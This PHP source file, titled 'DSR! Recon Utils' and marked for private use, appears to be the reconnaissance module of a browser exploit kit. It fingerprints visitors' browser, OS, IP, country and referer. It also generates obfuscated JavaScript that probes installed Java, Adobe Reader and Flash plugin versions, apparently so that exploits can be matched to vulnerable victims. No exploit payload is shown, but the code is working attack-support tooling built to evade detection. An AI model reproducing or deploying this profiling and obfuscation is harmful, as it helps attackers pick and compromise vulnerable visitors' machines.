<?php
/*
DSR! Recon Utils v2.7
For Private use only!
*/


function GetBrowser() {
	//http://www.useragentstring.com/pages/useragentstring.php
	$user_agent	= $_SERVER['HTTP_USER_AGENT'];
	$browser = 'Other';
	$version = 0;
	
	if (strstr($user_agent, 'Opera')) {
		$browser = 'Opera';
		if (preg_match("#Opera/(\\d+\\.?\\d*\\.?\\d*\\.?\\d*)#s", $user_agent, $vers))
			$version = $vers[1];
	} elseif (strstr($user_agent, 'MSIE')) {
		$browser = 'MSIE';
		if (preg_match("#MSIE (\\d+\\.?\\d*)#s", $user_agent, $vers))
			$version = $vers[1];	
	} elseif ((strstr($user_agent, 'Trident/') || strstr($user_agent, 'like Gecko')) && strstr($user_agent, 'rv:')) {
		$browser = 'MSIE';
		if (preg_match("#rv:(\\d+\\.?\\d*)#s", $user_agent, $vers))
			$version = $vers[1];
	} elseif (strstr($user_agent, 'Firefox')) {
		$browser = 'Firefox';
		if (preg_match("#Firefox/(\\d+\\.?\\d*\\.?\\d*\\.?\\d*)#s", $user_agent, $vers ))
			$version = $vers[1];
	} elseif (strstr($user_agent, 'Chrome')) {
		$browser = 'Chrome';
		if (preg_match("#Chrome/(\\d+\\.?\\d*\\.?\\d*\\.?\\d*\\.?\\d*)#s", $user_agent, $vers ))
			$version = $vers[1];
	} elseif (strstr($user_agent, 'Safari')) {
		$browser = 'Safari';
		if (preg_match("#Version/(\\d+\\.?\\d*\\.?\\d*\\.?\\d*\\.?\\d*)#s", $user_agent, $vers ))
			$version = $vers[1];
	} elseif (strstr($user_agent, 'Nav') || strstr($user_agent, 'Netscape'))
		$browser = 'Netscape';
	
	return array(
		"browser" => $browser,
		"version" => $version
	);
}

function GetIP() {
	if (getenv('REMOTE_ADDR'))
		$user_ip = getenv('REMOTE_ADDR');
	else if (getenv('HTTP_FORWARDED_FOR'))
		$user_ip = getenv('HTTP_FORWARDED_FOR');
	else if (getenv('HTTP_X_FORWARDED_FOR'))
		$user_ip = getenv('HTTP_X_FORWARDED_FOR');
	else if (getenv('HTTP_X_COMING_FROM'))
		$user_ip = getenv('HTTP_X_COMING_FROM');
	else if (getenv('HTTP_VIA'))
		$user_ip = getenv('HTTP_VIA');
	else if (getenv('HTTP_XROXY_CONNECTION'))
		$user_ip = getenv('HTTP_XROXY_CONNECTION');
	else if (getenv('HTTP_CLIENT_IP'))
		$user_ip = getenv('HTTP_CLIENT_IP');
   
	if (15 < strlen($user_ip)){
       $ar = split(', ', $user_ip);
       for($i=sizeof($ar)-1; $i > 0; $i--){
			if($ar[$i]!='' and !preg_match('/[a-zA-Zà-ÿÀ-ß]/', $ar[$i])) {
				$user_ip = $ar[$i];
				break;   
			}
			
			if($i==sizeof($ar)-1)
				$user_ip = 'Unknown';
       }
    }
   
	if (preg_match('/[a-zA-Zà-ÿÀ-ß]/', $user_ip))
		$user_ip = 'Unknown';
	
   return $user_ip;
}

function GetCountry($ip) {
	$baseFolder = dirname(__FILE__);
	require "$baseFolder/geoip.php";
	
	if ($ip === 'Unknown')
		$country = 0;
	else {
		$gi = geoip_open($baseFolder . '/GeoIP.dat', GEOIP_STANDARD);
		//$country = geoip_country_code_by_addr($gi, $ip);
		$country = geoip_country_id_by_addr($gi, $ip);
		geoip_close($gi);
		if(empty($country))
			$country = 0;
	}
	return $country;
}

function GetOS() {
	$user_browser = strtolower($_SERVER['HTTP_USER_AGENT']);
	if (strpos($user_browser, 'linux'))
		$os = 'LINUX';
	elseif (strpos($user_browser, 'macintosh') || strpos($user_browser, 'mac os'))
		$os = 'MAC';
	elseif (strpos($user_browser, 'mac platform x') || strpos($user_browser, 'os x'))
		$os = 'MAC X';
	elseif (strstr($user_browser, 'nt 6.3'))
		$os = 'WIN8.1';// or Windows Server 2012 R2
	elseif (strstr($user_browser, 'nt 6.2'))
		$os = 'WIN8';// or Windows Server 2012
	elseif (strstr($user_browser, 'nt 6.1'))
		$os = 'WIN7';// or Windows Server 2008 R2
	elseif (strstr($user_browser, 'nt 6.0') || strstr($user_browser, 'vista'))
		$os = 'VISTA';
	elseif (strstr($user_browser, 'nt 5.2') || strstr($user_browser, '2003'))
		$os = '2003';
	elseif (strstr($user_browser, 'nt 5.1') || strstr($user_browser, 'xp'))
		$os = 'XP';
	elseif (strstr($user_browser, 'nt 5') || strstr($user_browser, '2000'))
		$os = '2000';
	elseif ((strstr( $user_browser, '9x 4.9')) || ( strstr($user_browser, 'me')))
		$os = 'ME';
	elseif (strstr($user_browser, '98'))
		$os = '98';
	elseif (strstr($user_browser, 'nt 4'))
		$os = 'NT4';
	elseif (strstr($user_browser, '95'))
		$os = '95';
	else
		$os = 'OTHER';
	
	return $os;
}

function GetReferer() {
	$referer = strtolower((!empty($_SERVER['HTTP_REFERER'])) ? trim($_SERVER['HTTP_REFERER']) : trim(getenv('HTTP_REFERER')));
	
	if (empty($referer))
		$referer = 'No Referer';
	else {
		$referer = parse_url($referer);
	    $referer = str_replace('www.', '', $referer['host']);
		$referer = addslashes($referer);
		if ($referer === '') $referer = 'No Referer';
	}
	
	return $referer;
}

function GetBrowserJS($version) {
	$buffer = 'var ' . $version . ' = null;
		if (typeof navigator.userAgent === "string") {
			currentUE = navigator.userAgent;
			matchData = currentUE.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
			tmpVar = [];

			if (/trident/i.test(matchData[1])){
				tmpVar = /\brv[ :]+(\d+)/g.exec(currentUE) || [];
				' . $version . ' = ["MSIE", (tmpVar[1] || "")];
			}

			if (matchData[1] === "Chrome"){
				tmpVar = currentUE.match(/\bOPR\/(\d+)/)
				if (tmpVar!= null) 
					' . $version . ' = ["Opera" , tmpVar[1]];
			}

			matchData = matchData[2] ? [matchData[1], matchData[2]] : [navigator.appName, navigator.appVersion];
			if (' . $version . ' === null) {
				if ((tmpVar= currentUE.match(/version\/([\.\d]+)/i))!= null) 
					matchData.splice(1, 1, tmpVar[1]);
						
				' . $version . ' = matchData;
			}
		}
		';
		
	$variables = Array('currentUE', 'matchData', 'tmpVar');
	return JSObfuscate($buffer, $variables);
}

function GetJavaVersion($deployJava, $getJREs, $browser) {
	//getJREs() - Returns an array of currently-installed JRE version strings.
	//http://docs.oracle.com/javase/6/docs/technotes/guides/jweb/deployment_advice.html
	//http://www.java.com/js/deployJava.txt version: "20120801"
	
	$buffer = 
		'var ' . $deployJava . ' = function () {
		var rv = {
			firefoxJavaVersion: null,
			oldMimeType: "application/npruntime-scriptable-plugin;DeploymentToolkit",
			varmimeType: "application/java-deployment-toolkit",
			browserName: null,
			browserName2: null,
			' . $getJREs . ': function () {
				var list = new Array();
				if (this.isPluginInstalled()) {
					var varplugin = this.getPlugin();
					var VMs = varplugin.jvms;
					for (var counter = 0; counter < VMs.getLength(); counter++) {
						list[counter] = VMs.get(counter).version;
					}
				} else {
				' . (($browser === 'MSIE') ? '	
					if (this.testUsingActiveX("1.7.0")) {
						list[0] = "1.7.0";
					} else if (this.testUsingActiveX("1.6.0")) {
						list[0] = "1.6.0";
					} else if (this.testUsingActiveX("1.5.0")) {
						list[0] = "1.5.0";
					} else if (this.testUsingActiveX("1.4.2")) {
						list[0] = "1.4.2";
					} else if (this.testForMSVM()) {
						list[0] = "1.1";
					}
				' : '	
					var browser = this.getBrowser();
					if (browser == "NetscapeFamily") {
						this.getJPIVersionUsingMimeType();
						if (this.firefoxJavaVersion != null) {
							list[0] = this.firefoxJavaVersion;
						} else if (this.testUsingMimeTypes("1.7")) {
							list[0] = "1.7.0";
						} else if (this.testUsingMimeTypes("1.6")) {
							list[0] = "1.6.0";
						} else if (this.testUsingMimeTypes("1.5")) {
							list[0] = "1.5.0";
						} else if (this.testUsingMimeTypes("1.4.2")) {
							list[0] = "1.4.2";
						} else if (this.browserName2 == "Safari") {
							if (this.testUsingPluginsArray("1.7.0")) {
								list[0] = "1.7.0";
							} else if (this.testUsingPluginsArray("1.6")) {
								list[0] = "1.6.0";
							} else if (this.testUsingPluginsArray("1.5")) {
								list[0] = "1.5.0";
							} else if (this.testUsingPluginsArray("1.4.2")) {
								list[0] = "1.4.2";
							}
						}
					}
				') . '
				}
				return list;
			},
			isPluginInstalled: function () {
				var varplugin = this.getPlugin();
				if (varplugin && varplugin.jvms) {
					return true;
				} else {
					return false;
				}
			},
			getPlugin: function () {
				this.funcrefresh();
				var retvar = null;
				if (this.allowPlugin()) {
					retvar = document.getElementById("deployJavaPlugin");
				}
				return retvar;
			},
			writePluginTag: function () {
				var browser = this.getBrowser();
				' . (($browser === 'MSIE') ? '
				document.write("<" + \'object classid="clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA" \' + \'id="deployJavaPlugin" width="5" height="5">\' + "<" + "/" + "object" + ">");
				' : '	
				if (this.allowPlugin()) {
					this.writeEmbedTag();
				}
				') . '
			},
			funcrefresh: function () {
				navigator.plugins.refresh(false);
				var browser = this.getBrowser();
				' . (($browser === 'MSIE') ? '' : '
				if (this.allowPlugin()) {
					var varplugin = document.getElementById("deployJavaPlugin");
					if (varplugin == null) {
						this.writeEmbedTag();
					}
				}
				') . '
			},
			allowPlugin: function () {
				this.getBrowser();
				var retvar = ("Safari" != this.browserName2 && "Opera" != this.browserName2);
				return retvar;
			},
			getJPIVersionUsingMimeType: function () {
				for (var counter = 0; counter < navigator.mimeTypes.length; ++counter) {
					var s = navigator.mimeTypes[counter].type;
					var m = s.match(/^application\/x-java-applet;jpi-version=(.*)$/);
					if (m != null) {
						this.firefoxJavaVersion = m[1];
						if ("Opera" != this.browserName2) {
							break;
						}
					}
				}
			},
			getBrowser: function () {
				if (this.browserName == null) {
					var browser = navigator.userAgent.toLowerCase();
					if (browser.indexOf("iphone") != -1) {
						this.browserName = "NetscapeFamily";
						this.browserName2 = "iPhone";
					} else if ((browser.indexOf("firefox") != -1) && (browser.indexOf("opera") == -1)) {
						this.browserName = "NetscapeFamily";
						this.browserName2 = "Firefox";
					} else if (browser.indexOf("chrome") != -1) {
						this.browserName = "NetscapeFamily";
						this.browserName2 = "Chrome";
					} else if (browser.indexOf("safari") != -1) {
						this.browserName = "NetscapeFamily";
						this.browserName2 = "Safari";
					} else if ((browser.indexOf("mozilla") != -1) && (browser.indexOf("opera") == -1)) {
						this.browserName = "NetscapeFamily";
						this.browserName2 = "Other";
					} else if (browser.indexOf("opera") != -1) {
						this.browserName = "NetscapeFamily";
						this.browserName2 = "Opera";
					} else {
						this.browserName = "?";
						this.browserName2 = "unknown";
					}
				}
				return this.browserName;
			},
			testUsingActiveX: function (varversion) {
				var objectName = "JavaWebStart.isInstalled." + varversion + ".0";
				if (typeof ActiveXObject == "undefined" || !ActiveXObject) {
					return false;
				}
				try {
					return (new ActiveXObject(objectName) != null);
				} catch (exception) {
					return false;
				}
			},
			testForMSVM: function () {
				var clsid = "{08B0E5C0-4FCB-11CF-AAA5-00401C608500}";
				if (typeof oClientCaps != "undefined") {
					var v = oClientCaps.getComponentVersion(clsid, "ComponentID");
					if ((v == "") || (v == "5,0,5000,0")) {
						return false;
					} else {
						return true;
					}
				} else {
					return false;
				}
			},
			testUsingMimeTypes: function (varversion) {
				if (!navigator.mimeTypes) {
					return false;
				}
				for (var counter = 0; counter < navigator.mimeTypes.length; ++counter) {
					s = navigator.mimeTypes[counter].type;
					var m = s.match(/^application\/x-java-applet\x3Bversion=(1\.8|1\.7|1\.6|1\.5|1\.4\.2)$/);
					if (m != null) {
						if (this.compareVersions(m[1], varversion)) {
							return true;
						}
					}
				}
				return false;
			},
			testUsingPluginsArray: function (varversion) {
				if ((!navigator.plugins) || (!navigator.plugins.length)) {
					return false;
				}
				var platform = navigator.platform.toLowerCase();
				for (var counter = 0; counter < navigator.plugins.length; ++counter) {
					s = navigator.plugins[counter].description;
					if (s.search(/^Java Switchable Plug-in (Cocoa)/) != -1) {
						if (this.compareVersions("1.5.0", varversion)) {
							return true;
						}
					} else if (s.search(/^Java/) != -1) {
						if (platform.indexOf("win") != -1) {
							if (this.compareVersions("1.5.0", varversion) || this.compareVersions("1.6.0", varversion)) {
								return true;
							}
						}
					}
				}
				if (this.compareVersions("1.5.0", varversion)) {
					return true;
				}
				return false;
			},
			compareVersions: function (installed, required) {
				var a = installed.split(".");
				var b = required.split(".");
				for (var counter = 0; counter < a.length; ++counter) {
					a[counter] = Number(a[counter]);
				}
				for (var counter = 0; counter < b.length; ++counter) {
					b[counter] = Number(b[counter]);
				}
				if (a.length == 2) {
					a[2] = 0;
				}
				if (a[0] > b[0]) return true;
				if (a[0] < b[0]) return false;
				if (a[1] > b[1]) return true;
				if (a[1] < b[1]) return false;
				if (a[2] > b[2]) return true;
				if (a[2] < b[2]) return false;
				return true;
			},
			writeEmbedTag: function () {
				var written = false;
				if (navigator.mimeTypes != null) {
					for (var counter = 0; counter < navigator.mimeTypes.length; counter++) {
						if (navigator.mimeTypes[counter].type == this.varmimeType) {
							if (navigator.mimeTypes[counter].enabledPlugin) {
								document.write(\'<\' + \'embed id="deployJavaPlugin" type="\' + this.varmimeType + \'" hidden="true" width="5" height="5" />\');
								written = true;
							}
						}
					}
					if (!written) for (var counter = 0; counter < navigator.mimeTypes.length; counter++) {
						if (navigator.mimeTypes[counter].type == this.oldMimeType) {
							if (navigator.mimeTypes[counter].enabledPlugin) {
								document.write(\'<\' + \'embed id="deployJavaPlugin" type="\' + this.oldMimeType + \'" hidden="true" width="5" height="5" />\');
							}
						}
					}
				}
			}
		};
		rv.writePluginTag();
		return rv;
	}();';

	$variables = Array('rv', 'firefoxJavaVersion', 'oldMimeType', 'varmimeType', 'browserName2', 
		'browserName', 'list', 'isPluginInstalled', 'varplugin', 'counter', 'getPlugin', 'VMs', 
		'browser', 'getBrowser', 'NetscapeFamily', 'testUsingActiveX', 'testForMSVM', 
		'getJPIVersionUsingMimeType', 'testUsingMimeTypes',	'testUsingPluginsArray', 'funcrefresh',
		'retvar', 'allowPlugin', 'deployJavaPlugin', 'writePluginTag', 'writeEmbedTag', 'varversion',
		'objectName', 'compareVersions');
		
	return JSObfuscate($buffer, $variables);
}
	
function GetPDFVersion($version, $browser) {
	$buffer = 'var ' . $version . ' = null;
		' . (($browser === 'MSIE') ? '
		//if (window.ActiveXObject) {
		if (typeof window.ActiveXObject !== undefined) {
			function loadAXO(target){
				var loaded = null;
				try{
					loaded = new ActiveXObject(target)
				}catch(error){}
				return loaded;
			}
				
			pdfObject = null;
			acroVariants = ["AcroPDF.PDF", "AcroPDF.PDF.1", "PDF.PdfCtrl", "PDF.PdfCtrl.5", "PDF.PdfCtrl.1"];
			for (counter = 0; counter < acroVariants.length; counter++) {
				if (pdfObject = loadAXO(acroVariants[counter]))
					break;
			}
				
			//if ((pdfObject) && (pdfObject.browser.ActiveXEnabled =! 0)){
			if (pdfObject){
				searchPattern = /=\s*([\d\.]+)/g;
				try {
					pdfObject = pdfObject.GetVersions();
					for (counter = 0; counter < 10; counter++) {
						if (searchPattern.test(pdfObject) && (!' . $version . ' || RegExp.$1 > ' . $version . ')) {
							' . $version . ' = RegExp.$1;
							break;
						}
					}
				} catch (error) {}					
			}
		}	
		' : '
		if (typeof navigator.plugins != "undefined") {
			for (counter = 0; counter < navigator.plugins.length; counter++){
				tmpVar = navigator.plugins[counter].name.toLowerCase();
				if (tmpVar.indexOf("adobe acrobat") >= 0 || tmpVar.indexOf("adobe reader") >= 0) {
					' . $version . ' = navigator.plugins[counter].version;					
					break;
				}
			}
		}	
		');
	
	$variables = Array('pdfObject', 'error', 'pdfVersion', 'searchPattern', 'counter', 'tmpVar');
	return JSObfuscate($buffer, $variables);
}

function GetFlashVersion($version, $browser) {
	//http://www.featureblend.com/flash_detect_1-0-4/flash_detect.js
	/*
	currentBody = document.getElementsByTagName("body")[0];
	testObject = document.createElement("object");
	testObject.setAttribute("type", "application/x-shockwave-flash");
	var testChild = currentBody.appendChild(testObject);
	if (testChild) {
		var counter = 0;
		(function(){
			if (typeof testChild.GetVariable != "undefined") {
				var getVersion = testChild.GetVariable("$version");
				if (getVersion) {
					getVersion = getVersion.split(" ")[1].split(",");
					flashVersion = [parseInt(getVersion[0], 10), parseInt(getVersion[1], 10), parseInt(getVersion[2], 10)];
					alert(flashVersion);
				}
			} else if (counter < 10) {
				counter++;
				setTimeout(arguments.callee, 10);
				return;
			}
			currentBody.removeChild(testObject);
			testChild = null;
		})();
	}
	*/
	
	$buffer = 'var ' . $version . ' = null;
		' . (($browser === 'MSIE') ? '
		//if (window.ActiveXObject) {
		if (typeof window.ActiveXObject !== undefined) {
			try {
				var targetObject = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
				if (targetObject) {
					pluginVersion = targetObject.GetVariable("$version");
					if (pluginVersion) {
						majorMinor = pluginVersion.split(" ")[1].split(",");
						' . $version . ' = [parseInt(majorMinor[0], 10), parseInt(majorMinor[1], 10), parseInt(majorMinor[2], 10), parseInt(majorMinor[3], 10)];
					}
				}
			}
			catch(error) {}			
		}	
		' : '
		if (typeof navigator.plugins != "undefined") {
			targetObject = navigator.mimeTypes;
			targetType = "application/x-shockwave-flash";
			console.log(targetObject);
			for (counter = 0; counter < navigator.plugins.length; counter++){
				if (navigator.plugins[counter].name.toLowerCase().indexOf("shockwave flash") >= 0) {
					pluginVersion = navigator.plugins[counter].version;
					//if (pluginVersion && !(targetObject && targetObject[targetType] && !targetObject[targetType].enabledPlugin)) { 
					if (pluginVersion) { 
						majorMinor = pluginVersion.split(/\./);
						' . $version . ' = [parseInt(majorMinor[0], 10), parseInt(majorMinor[1], 10), parseInt(majorMinor[2], 10), parseInt(majorMinor[3], 10)];
						
						descParts = navigator.plugins[counter].description.split(/ +/);
						if (descParts.length == 4)
							' . $version . '[4] = parseInt(descParts[3].replace(/[a-zA-Z]/g, ""), 10);
						
						break;
					}
				}
			}
			
			if (' . $version . ' == null && targetObject && targetObject[targetType] && targetObject[targetType].enabledPlugin && targetObject[targetType].enabledPlugin.description) {
				descParts = targetObject[targetType].enabledPlugin.description.split(/ +/);
				majorMinor = descParts[2].split(/\./);
				' . $version . ' = [parseInt(majorMinor[0], 10), parseInt(majorMinor[1], 10), 0, 0, parseInt(descParts[3].replace(/[a-zA-Z]/g, ""), 10)];
			}
		}
		');
	
	$variables = Array('mimeTypes', 'targetType', 'counter', 'pluginVersion', 'descParts', 'majorMinor');
	return JSObfuscate($buffer, $variables);
}

?>